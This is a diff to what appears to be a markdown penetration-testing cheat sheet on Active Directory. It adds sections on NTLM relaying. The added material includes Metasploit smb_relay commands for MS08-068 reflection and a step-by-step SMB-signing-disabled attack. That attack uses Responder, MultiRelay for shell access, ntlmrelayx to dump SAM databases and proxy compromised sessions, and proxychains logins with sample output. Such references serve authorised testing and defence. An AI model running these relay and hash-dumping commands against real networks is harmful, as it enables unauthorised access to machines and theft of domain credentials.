@@ -23,6 +23,8 @@
   * [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
   * [Capturing and cracking NTLMv2 hashes](#capturing-and-cracking-ntlmv2-hashes)
   * [NTLMv2 hashes relaying](#ntlmv2-hashes-relaying)
+    * [MS08-068 NTLM reflection](#ms08-068-ntlm-reflection)
+    * [SMB Signing Disabled](#smb-signing-disabled)
   * [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
   * [Trust relationship between domains](#trust-relationship-between-domains)
   * [Unconstrained delegation](#unconstrained-delegation)
@@ -658,12 +660,62 @@ hashcat -m 5600 -a 0 hash.txt crackstation.txt
 
 ### NTLMv2 hashes relaying
 
+NTLMv1 and NTLMv2 can be relayed to connect to another machine.
+
+| Hash                 | Hashcat | Attack method       |
+|---|---|---|
+| LM                    | 3000  | crack/pass the hash  |
+| NTLM/NTHash           | 1000  | crack/pass the hash  |
+| NTLMv1/Net-NTLMv1     | 5500  | crack/relay attack   |
+| NTLMv2/Net-NTLMv2     | 5600  | crack/relay attack   |
+
+#### MS08-068 NTLM reflection
+
+NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to Windows Server 2008.
+
+> This vulnerability allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim machine using the victim’s own credentials.
+
+* https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068
+
+```powershell
+msf > use exploit/windows/smb/smb_relay
+msf exploit(smb_relay) > show targets
+```
+
+#### SMB Signing Disabled 
+
 If a machine has `SMB signing`:`disabled`, it is possible to use Responder with Multirelay.py script to perform an `NTLMv2 hashes relay` and get a shell access on the machine.
 
 1. Open the Responder.conf file and set the value of `SMB` and `HTTP` to `Off`.
+    ```powershell
+    [Responder Core]
+    ; Servers to start
+    ...
+    SMB = Off     # Turn this off
+    HTTP = Off    # Turn this off
+    ```
 2. Run `python  RunFinger.py -i IP_Range` to detect machine with `SMB signing`:`disabled`.
 3. Run `python Responder.py -I <interface_card>` and `python MultiRelay.py -t <target_machine_IP> -u ALL`
-4. Wait for a shell
+4. Also you can use `ntlmrelayx` to dump the SAM database of the targets in the list. 
+    ```powershell
+    ntlmrelayx.py -tf targets.txt
+    ```
+5. ntlmrelayx can also act as a SOCK proxy with every compromised sessions.
+    ```powershell
+    $ ntlmrelayx.py -tf /tmp/targets.txt -socks -smb2support
+    [*] Servers started, waiting for connections
+    Type help for list of commands
+    ntlmrelayx> socks
+    Protocol  Target          Username                  Port
+    --------  --------------  ------------------------  ----
+    MSSQL     192.168.48.230  VULNERABLE/ADMINISTRATOR  1433
+    SMB       192.168.48.230  CONTOSO/NORMALUSER1       445
+    MSSQL     192.168.48.230  CONTOSO/NORMALUSER1       1433
+    
+    $ proxychains smbclient //192.168.48.230/Users -U contoso/normaluser1
+    $ proxychains mssqlclient.py contoso/normaluser1@192.168.48.230 -windows-auth
+    ```
+
 
 ### Dangerous Built-in Groups Usage
 
@@ -1043,3 +1095,4 @@ PXE allows a workstation to boot from the network by retrieving an operating sys
 * [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory -  Sean Metcalf](https://adsecurity.org/?p=3592)
 * [All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018](https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/)
 * [Taming the Beast Assess Kerberos-Protected Networks - Emmanuel Bouillon](https://www.blackhat.com/presentations/bh-europe-09/Bouillon/BlackHat-Europe-09-Bouillon-Taming-the-Beast-Kerberous-slides.pdf)
+* [Playing with Relayed Credentials - June 27, 2018](https://www.secureauth.com/blog/playing-relayed-credentials)
